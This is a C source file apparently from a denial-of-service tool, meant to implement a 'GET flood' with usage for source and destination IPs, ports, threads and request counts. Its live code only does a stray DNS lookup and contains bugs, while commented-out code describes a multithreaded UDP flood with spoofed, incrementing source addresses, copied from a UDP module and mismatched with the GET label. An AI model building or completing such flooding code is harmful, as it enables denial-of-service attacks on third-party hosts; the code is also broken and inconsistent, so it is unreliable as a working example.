#include "../header.h"
#include "../base/make_ipv4.h"
#include "../ddos/get_flood.h"


void get_flood_print_usage(void)
{
	printf("GET flood Usage : [Src-IP] [Dest-IP] [Src-Port] [Dest-Port] [# thread] [# requests] \n");
	return;
}

void* generate_get_request(void *data)
{
	/*
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_UDP);
	while (1) {

		struct udphdr *p;
		char buffer[sizeof(struct udphdr)];

		memset(buffer, 0x00, sizeof(struct udphdr));

		//make protocol
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_UDP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(udp_src_ip));

		//modify udp_src_ip, increment 1.
		next_ip_addr(udp_src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(udp_dest_ip));

		p = (struct udphdr *) buffer;
		p->check = 0;
		p->src_port = htons(udp_src_port);
		p->dest_port = htons(udp_dest_port);
		strcpy(p->data, DATA);
		p->len = htons(strlen(DATA));

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct udphdr));
		char *packet = packet_assemble(ipv4_h, p, sizeof(struct udphdr));

		pthread_mutex_lock(&udp_mutex);

		if (udp_produced >= udp_total) {
			pthread_mutex_unlock(&udp_mutex);
			pthread_cond_broadcast(&udp_cond);
			return 0;
		}

		send_packet(sock, ipv4_h, packet, udp_src_port);
		free(packet);
		udp_produced++;

		pthread_mutex_unlock(&udp_mutex);
	}
	close(sock);
	return 0;
	*/
	return NULL;
}


void get_flood_run(char *argv[])
{
	struct hostent *host = gethostbyname("www.google.co.kr");
	printf("%s\n", host->h_name);
	char hostbuf[100], servbuf[100];
	memset(hostbuf, 100, 0);
	memset(servbuf, 100, 0);
	struct sockaddr addr;
	addr.sa_family = AF_INET;
	strcpy(addr.sa_data, "8.8.8.8");
	getnameinfo(&addr, sizeof(struct sockaddr), hostbuf, 100, servbuf, 100, 0);
	in_addr inaddr;
	inet_aton(hostbuf, &inaddr);
	printf("%s %s\n", inet_ntoa(inaddr), servbuf);
	/*
	udp_src_ip = (char*) malloc(sizeof(char) * 20);

	int argc = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (argc != 6) {
		udp_flood_print_usage();
		return;
	}

	strcpy(udp_src_ip, argv[0]);

	udp_mutex = PTHREAD_MUTEX_INITIALIZER;

	udp_src_port = atoi(argv[2]);
	udp_dest_port = atoi(argv[3]);

	udp_produced = 0;
	udp_total = atoi(argv[5]);

	int num_threads = atoi(argv[4]);

	udp_dest_ip = argv[1];

	int *generate_thread_id;
	pthread_t *generate_thread;


	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads+1));
	generate_thread = (pthread_t*) malloc(sizeof(pthread_t) * (num_threads+1));
	int i;


	printf("Sending UDP requests to %s using %d threads\n",udp_dest_ip, num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;


	for (i = 0; i < num_threads; i++) 
		pthread_create(&generate_thread[i], NULL, generate_udp_request,
			(void*) &generate_thread_id[i]);

	for (i = 0; i < num_threads; i++) {
		void *status;
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}


	pthread_mutex_destroy(&udp_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(udp_src_ip);
	*/
}
